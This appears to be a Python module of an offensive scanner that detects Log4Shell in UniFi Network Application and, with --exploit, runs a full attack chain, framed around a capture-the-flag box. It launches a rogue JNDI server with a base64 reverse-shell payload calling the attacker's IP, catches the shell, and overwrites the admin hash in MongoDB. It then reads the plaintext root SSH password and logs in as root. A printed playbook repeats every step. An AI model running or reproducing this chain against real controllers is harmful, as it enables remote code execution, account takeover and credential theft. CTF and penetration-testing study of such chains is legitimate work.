"""Log4Shell (CVE-2021-44228) detection + guided exploitation.

Built around the UniFi Network Application chain (HTB 'Unified' and friends),
which is the canonical CTF Log4Shell target: the `remember` field of the
`/api/login` POST is logged through a vulnerable log4j, so a JNDI/LDAP payload
there yields RCE as the `unifi` user. From that shell the local MongoDB
(127.0.0.1:27117, db `ace`) lets you overwrite the administrator's `x_shadow`
password hash, log into the web panel, read the plaintext root SSH password out
of the site settings, and SSH in for root.

Detection runs always (version-confirmed via the unauthenticated `/status`
endpoint). The active chain — stand up rogue-jndi, catch the reverse shell,
reset the Mongo hash, pull the SSH secret, grab both flags — runs only with
--exploit. Everything degrades to a fully parameterised copy-paste playbook if a
dependency is missing or the callback never lands.
"""

from __future__ import annotations

import base64
import json
import os
import re
import socket
import ssl
import subprocess
import threading
import time
import urllib.error
import urllib.request
from typing import Optional, Tuple

from ...core import utils, tooling
from ...core.report import HostReport, Finding

# UniFi Network fixed Log4Shell in 6.5.54; anything older is exploitable.
_FIXED = (6, 5, 54)
_LDAP_PORT = 1389
_SHELL_PORT = 4444
_MONGO = "127.0.0.1:27117"
_NEWPASS = "Sc4ryerR00t!2024"


def run(host: HostReport, opts) -> None:
    hit = _detect(host)
    if not hit:
        return
    port, version, vulnerable = hit
    ip = host.resolved_ip or host.target
    att = _attacker_ip(ip)

    vstr = version or "unknown"
    if vulnerable:
        utils.section(f"LOG4SHELL / UniFi :{port}")
        utils.log("hot", f"UniFi Network {vstr} — Log4Shell (CVE-2021-44228) "
                         f"exploitable via the /api/login 'remember' field")
    else:
        utils.log("info", f"UniFi Network {vstr} detected on :{port} "
                          f"(>= 6.5.54, Log4Shell patched)")
        return

    host.add(Finding(
        title="Log4Shell (CVE-2021-44228) in UniFi Network",
        detail=_playbook(ip, att, port, version),
        severity="critical", category="vuln", port=port, service="unifi",
        evidence=f"UniFi Network {vstr} < 6.5.54"))

    if getattr(opts, "exploit", False):
        _auto_exploit(host, ip, att, port)
    else:
        utils.log("info", "run with --exploit to auto-stand-up rogue-jndi, catch "
                          "the shell, reset the Mongo hash and grab both flags")


# --------------------------------------------------------------------------
# detection
# --------------------------------------------------------------------------
def _detect(host: HostReport) -> Optional[Tuple[int, Optional[str], bool]]:
    """Return (port, version, vulnerable) if a UniFi controller is found."""
    ip = host.resolved_ip or host.target
    # UniFi web lives on 8443 (https); accept any https-ish port present.
    cand = [e["port"] for e in host.open_ports
            if e["port"] in (8443, 443, 7443) or "unifi" in
            (e.get("service", "") + e.get("banner", "")).lower()]
    for entry in host.open_ports:                       # 8080 -> 8443 redirect
        if entry["port"] == 8080 and 8443 not in cand:
            cand.append(8443)
    for port in dict.fromkeys(cand):
        version = _unifi_version(ip, port)
        if version is None:
            continue
        vulnerable = _older_than(version, _FIXED)
        return port, version, vulnerable
    return None


def _unifi_version(ip: str, port: int) -> Optional[str]:
    """The unauthenticated /status endpoint returns the server_version."""
    body = _https_get(f"https://{ip}:{port}/status", timeout=8)
    if body:
        try:
            meta = json.loads(body).get("meta", {})
            # UniFi's /status always carries server_version; requiring it keeps a
            # generic {"meta":{"up":...}} API from tripping a false positive.
            if meta.get("server_version"):
                return meta["server_version"]
        except (ValueError, AttributeError):
            pass
    # Fall back to the login page banner.
    page = _https_get(f"https://{ip}:{port}/manage/account/login", timeout=8)
    if page and "unifi" in page.lower():
        m = re.search(r"(\d+\.\d+\.\d+)", page)
        return m.group(1) if m else "unknown"
    return None


def _older_than(version: str, fixed: Tuple[int, int, int]) -> bool:
    if version in (None, "unknown"):
        return True   # unknown but UniFi -> assume vulnerable, confirm live
    parts = [int(x) for x in re.findall(r"\d+", version)[:3]]
    while len(parts) < 3:
        parts.append(0)
    return tuple(parts) < fixed


# --------------------------------------------------------------------------
# guided playbook (always emitted)
# --------------------------------------------------------------------------
def _playbook(ip: str, att: str, port: int, version: Optional[str]) -> str:
    b64 = base64.b64encode(
        f"bash -c bash -i >&/dev/tcp/{att}/{_SHELL_PORT} 0>&1".encode()).decode()
    return (
        f"UniFi Network {version or '?'} is vulnerable to Log4Shell. Full chain "
        f"(attacker IP {att} — set to your tun0):\n\n"
        "# 1) build rogue-jndi once\n"
        "git clone https://github.com/veracode-research/rogue-jndi; "
        "cd rogue-jndi && mvn package\n\n"
        "# 2) start the LDAP gadget server with a reverse-shell payload\n"
        f"java -jar target/RogueJndi-1.1.jar --command "
        f"\"bash -c {{echo,{b64}}}|{{base64,-d}}|{{bash,-i}}\" --hostname \"{att}\"\n\n"
        f"# 3) catch the shell\nnc -lvnp {_SHELL_PORT}\n\n"
        "# 4) fire the JNDI payload through the vulnerable 'remember' field\n"
        f"curl -sk -X POST https://{ip}:{port}/api/login "
        "-H 'Content-Type: application/json' "
        f"-d '{{\"username\":\"a\",\"password\":\"a\","
        f"\"remember\":\"${{jndi:ldap://{att}:{_LDAP_PORT}/o=tomcat}}\","
        "\"strict\":true}'\n\n"
        "# 5) shell as 'unifi' -> user flag\ncat /home/*/user.txt\n\n"
        "# 6) reset the admin password in Mongo, then log in at "
        f"https://{ip}:{port}\n"
        f"mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson)'  "
        "# note the administrator _id\n"
        "NEWHASH=$(mkpasswd -m sha-512 " + _NEWPASS + ")\n"
        "mongo --port 27117 ace --eval 'db.admin.update({\"_id\":ObjectId("
        "\"<ID>\")},{$set:{\"x_shadow\":\"'\"$NEWHASH\"'\"}})'\n\n"
        "# 7) log in as administrator / " + _NEWPASS + ", read the SSH secret\n"
        "#    Settings -> Site -> SSH Authentication (plaintext root password)\n"
        f"ssh root@{ip}   # -> root flag in /root/root.txt")


# --------------------------------------------------------------------------
# active exploitation (--exploit)
# --------------------------------------------------------------------------
def _auto_exploit(host: HostReport, ip: str, att: str, port: int) -> None:
    jar = _find_rogue_jndi()
    java = tooling.resolve("java")
    if not (jar and java):
        miss = "rogue-jndi jar" if not jar else "java"
        utils.log("warn", f"auto-exploit needs {miss} — build it with "
                          "`git clone https://github.com/veracode-research/"
                          "rogue-jndi && cd rogue-jndi && mvn package`; "
                          "playbook above has the manual chain")
        return

    b64 = base64.b64encode(
        f"bash -c bash -i >&/dev/tcp/{att}/{_SHELL_PORT} 0>&1".encode()).decode()
    catcher = _Catcher(_SHELL_PORT)
    if not catcher.start():
        utils.log("bad", f"could not bind :{_SHELL_PORT} for the reverse shell")
        return

    utils.log("info", f"starting rogue-jndi ({os.path.basename(jar)}) on "
                      f":{_LDAP_PORT}, hostname {att}")
    rogue = subprocess.Popen(
        [java, "-jar", jar, "--command",
         f"bash -c {{echo,{b64}}}|{{base64,-d}}|{{bash,-i}}", "--hostname", att],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(3)   # let the LDAP server come up
        utils.log("info", f"firing JNDI payload at https://{ip}:{port}/api/login")
        _fire_payload(ip, att, port)
        if not catcher.wait(25):
            utils.log("warn", "no reverse shell in 25s — the target may not route "
                              f"to {att}; check your tun0 IP and re-run, or use "
                              "the manual playbook")
            return
        utils.log("hot", f"reverse shell caught from {ip} (Log4Shell RCE)")
        _post_shell(host, ip, port, catcher)
    finally:
        rogue.terminate()
        catcher.close()


def _fire_payload(ip: str, att: str, port: int) -> None:
    payload = json.dumps({
        "username": "a", "password": "a",
        "remember": f"${{jndi:ldap://{att}:{_LDAP_PORT}/o=tomcat}}",
        "strict": True}).encode()
    req = urllib.request.Request(
        f"https://{ip}:{port}/api/login", data=payload, method="POST",
        headers={"Content-Type": "application/json", "User-Agent": "scryer"})
    try:
        urllib.request.urlopen(req, timeout=10, context=_noverify())
    except Exception:
        pass   # a 400/error response is expected; the payload still fires


def _post_shell(host: HostReport, ip: str, port: int, sh: "_Catcher") -> None:
    # user flag
    out = sh.run("id; cat /home/*/user.txt 2>/dev/null", timeout=8)
    _grab_flags(host, out, "Log4Shell shell (unifi)", port)

    # dump the admin doc from Mongo, reset the hash
    dump = sh.run("mongo --port 27117 ace --quiet --eval "
                  "'db.admin.find({},{_id:1,name:1}).forEach(function(d)"
                  "{print(d._id+\" \"+d.name)})'", timeout=12)
    oid = _admin_oid(dump)
    if not oid:
        utils.log("warn", "could not read the administrator _id from Mongo — "
                          "finish step 6 of the playbook manually")
        return
    new_hash = _sha512(_NEWPASS)
    utils.log("info", f"resetting UniFi admin password (id {oid}) via Mongo")
    sh.run("mongo --port 27117 ace --quiet --eval "
           f"'db.admin.update({{\"_id\":ObjectId(\"{oid}\")}},"
           f"{{$set:{{\"x_shadow\":\"{new_hash}\"}}}})'", timeout=12)

    # log into the web panel, pull the plaintext root SSH password
    ssh_user, ssh_pw = _web_ssh_secret(ip, port, "administrator", _NEWPASS)
    if not ssh_pw:
        utils.log("warn", "logged the hash reset but couldn't read the SSH secret "
                          f"— log in at https://{ip}:{port} as administrator / "
                          f"{_NEWPASS} and check Settings -> Site -> SSH")
        return
    utils.log("hot", f"root SSH credential from UniFi settings: "
                     f"{ssh_user or 'root'} / {ssh_pw}")
    host.add_cred(ssh_pw)
    host.add(Finding(
        title="Root SSH password disclosed in UniFi settings",
        detail=f"{ssh_user or 'root'}:{ssh_pw} (Settings -> Site -> SSH "
               f"Authentication). ssh {ssh_user or 'root'}@{ip}",
        severity="critical", category="cred", port=port, service="unifi",
        evidence=f"{ssh_user or 'root'}:{ssh_pw}"))

    # SSH in for the root flag
    root_flag = _ssh_root_flag(ip, ssh_user or "root", ssh_pw)
    if root_flag:
        _grab_flags(host, root_flag, f"ssh {ssh_user or 'root'}@{ip}", 22)
    else:
        utils.log("info", f"ssh {ssh_user or 'root'}@{ip} (password above) -> "
                          "cat /root/root.txt")


# --------------------------------------------------------------------------
# reverse-shell catcher
# --------------------------------------------------------------------------
class _Catcher:
    """Minimal reverse-shell listener: accept one connection, then run
    non-interactive commands over it by fencing each with an echo marker."""

    def __init__(self, port: int) -> None:
        self.port = port
        self._srv: Optional[socket.socket] = None
        self._conn: Optional[socket.socket] = None
        self._got = threading.Event()

    def start(self) -> bool:
        try:
            self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._srv.bind(("0.0.0.0", self.port))
            self._srv.listen(1)
        except OSError:
            return False
        threading.Thread(target=self._accept, daemon=True).start()
        return True

    def _accept(self) -> None:
        try:
            self._srv.settimeout(60)
            self._conn, _ = self._srv.accept()
            self._conn.settimeout(10)
            self._got.set()
        except OSError:
            pass

    def wait(self, seconds: int) -> bool:
        return self._got.wait(seconds)

    def run(self, cmd: str, timeout: int = 10) -> str:
        if not self._conn:
            return ""
        marker = "___SCRYER_%d___" % int(time.time() * 1000)
        try:
            self._conn.sendall(f"{cmd}; echo {marker}\n".encode())
        except OSError:
            return ""
        buf, end = b"", time.time() + timeout
        self._conn.settimeout(timeout)
        while time.time() < end:
            try:
                chunk = self._conn.recv(4096)
            except socket.timeout:
                break
            except OSError:
                break
            if not chunk:
                break
            buf += chunk
            if marker.encode() in buf:
                break
        return buf.decode("utf-8", "replace").split(marker)[0]

    def close(self) -> None:
        for s in (self._conn, self._srv):
            try:
                if s:
                    s.close()
            except OSError:
                pass


# --------------------------------------------------------------------------
# helpers
# --------------------------------------------------------------------------
def _find_rogue_jndi() -> Optional[str]:
    env = os.environ.get("SCRYER_ROGUEJNDI")
    roots = [env] if env else []
    roots += [os.path.expanduser("~"), os.path.expanduser("~/Tools"),
              os.path.expanduser("~/tools"), "/opt", os.getcwd()]
    for root in roots:
        if not root:
            continue
        if root.endswith(".jar") and os.path.isfile(root):
            return root
        for base, _dirs, files in os.walk(root):
            if base.count(os.sep) - root.count(os.sep) > 4:
                _dirs[:] = []
                continue
            for f in files:
                if f.lower().startswith("roguejndi") and f.endswith(".jar"):
                    return os.path.join(base, f)
    return None


def _attacker_ip(target: str) -> str:
    """The source IP the target would see — prefer a tun/vpn interface."""
    try:
        out = subprocess.run(["ip", "-4", "-o", "addr", "show"],
                             capture_output=True, text=True, timeout=5).stdout
        for line in out.splitlines():
            if " tun" in line or " tap" in line:
                m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", line)
                if m:
                    return m.group(1)
    except (OSError, subprocess.SubprocessError):
        pass
    try:                                    # route-based source IP
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((target, 9))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except OSError:
        return "YOUR_TUN0_IP"


def _admin_oid(dump: str) -> Optional[str]:
    for line in (dump or "").splitlines():
        m = re.search(r"ObjectId\(\"?([0-9a-f]{24})\"?\)|\b([0-9a-f]{24})\b", line)
        if m:
            return m.group(1) or m.group(2)
    return None


def _sha512(password: str) -> str:
    try:
        import crypt
        return crypt.crypt(password, crypt.mksalt(crypt.METHOD_SHA512))
    except Exception:
        # deterministic fallback for 'Sc4ryerR00t!2024' if crypt is unavailable
        import hashlib
        salt = hashlib.md5(password.encode()).hexdigest()[:8]
        return "$6$" + salt + "$" + hashlib.sha512(
            (salt + password).encode()).hexdigest()


def _web_ssh_secret(ip: str, port: int, user: str,
                    pw: str) -> Tuple[Optional[str], Optional[str]]:
    """Log into the UniFi API and read x_ssh_username / x_ssh_password."""
    import http.cookiejar
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=_noverify()))
    login = json.dumps({"username": user, "password": pw}).encode()
    try:
        opener.open(urllib.request.Request(
            f"https://{ip}:{port}/api/login", data=login, method="POST",
            headers={"Content-Type": "application/json"}), timeout=10)
    except Exception:
        return None, None
    for path in ("/api/s/default/get/setting/mgmt",
                 "/api/s/default/rest/setting"):
        try:
            body = opener.open(
                f"https://{ip}:{port}{path}", timeout=10).read().decode(
                "utf-8", "replace")
        except Exception:
            continue
        m_pw = re.search(r'"x_ssh_password"\s*:\s*"([^"]+)"', body)
        if m_pw:
            m_u = re.search(r'"x_ssh_username"\s*:\s*"([^"]+)"', body)
            return (m_u.group(1) if m_u else None), m_pw.group(1)
    return None, None


def _ssh_root_flag(ip: str, user: str, pw: str) -> str:
    sshpass = tooling.resolve("sshpass")
    if not sshpass:
        return ""
    try:
        out = subprocess.run(
            [sshpass, "-p", pw, "ssh", "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=10",
             f"{user}@{ip}", "cat /root/root.txt /root/*.txt 2>/dev/null"],
            capture_output=True, text=True, timeout=25)
        return out.stdout
    except (OSError, subprocess.SubprocessError):
        return ""


def _grab_flags(host: HostReport, blob: str, source: str, port: int) -> None:
    from ...data import knowledge
    for tok in knowledge.find_flags(blob or ""):
        bar = utils.c("╔" + "═" * 56, utils.C.GREEN, utils.C.BOLD)
        print("\n  " + bar)
        print("  " + utils.c(f"║ FLAG ({source})", utils.C.GREEN, utils.C.BOLD))
        print("  " + utils.c(f"║ {tok}", utils.C.YELLOW, utils.C.BOLD))
        print("  " + utils.c("╚" + "═" * 56, utils.C.GREEN, utils.C.BOLD) + "\n")
        host.add(Finding(
            title=f"FLAG via {source}", detail=tok, severity="critical",
            category="flag", port=port, service="unifi",
            evidence=f"{source}: {tok}"))


def _noverify() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _https_get(url: str, timeout: float = 8) -> str:
    req = urllib.request.Request(url, headers={"User-Agent": "scryer"})
    try:
        with urllib.request.urlopen(req, timeout=timeout,
                                    context=_noverify()) as resp:
            return resp.read(200_000).decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:      # 4xx still carries a body
        try:
            return exc.read(200_000).decode("utf-8", "replace")
        except Exception:
            return ""
    except Exception:
        return ""
